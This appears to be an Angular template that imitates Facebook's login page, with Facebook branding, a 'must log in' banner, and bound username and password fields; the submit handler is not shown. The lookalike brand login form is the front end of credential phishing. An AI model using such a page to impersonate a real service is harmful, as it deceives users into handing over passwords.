<div class="flex justify-center items-center min-h-screen bg-gray-100">
    <div class="text-center">
        <p class="logo text-4xl font-bold text-blue-600 mb-4">facebook</p>
        <p class=" inline-block text-gray-600 mb-4 border-solid border-1 pr-100 border-blue-700 text-xs p-2 ">â„¹ You must
            log in to continue.</p>
        <form class="bg-white shadow-lg rounded-lg p-6 w-80 ml-30" #loginForm="ngForm" (ngSubmit)="submitForm()">
            <p class="text-xl font-semibold mb-6">Log in to Facebook</p>
            <p class="text-black-500  mb-4 border-solid border-1 border-yellow-700 bg-yellow-100 text-xs p-2">You
                must log in to continue</p>
            <input
                class="w-full p-2 border border-gray-300 rounded-md mb-2 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 text-sm"
                type="text" name="uname" [(ngModel)]="logobj.uname" required placeholder="Username" />
            <input
                class="w-full p-2 border border-gray-300 rounded-md mb-4 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 text-sm"
                type="password" name="upass" [(ngModel)]="logobj.upass" required placeholder="Password" />
            <br />
            <button type="submit"
                class="w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 mb-4 cursor-pointer">Log
                in</button>

            <div class="flex justify-center text-blue-600 text-[10px]">
                <p class="cursor-pointer">Forgotten account?</p>
                <p class="cursor-pointer ml-6">Sign up for Facebook</p>
            </div>
        </form>
        <p class="block whitespace-pre-line">{{comments}}</p>
    </div>
</div>
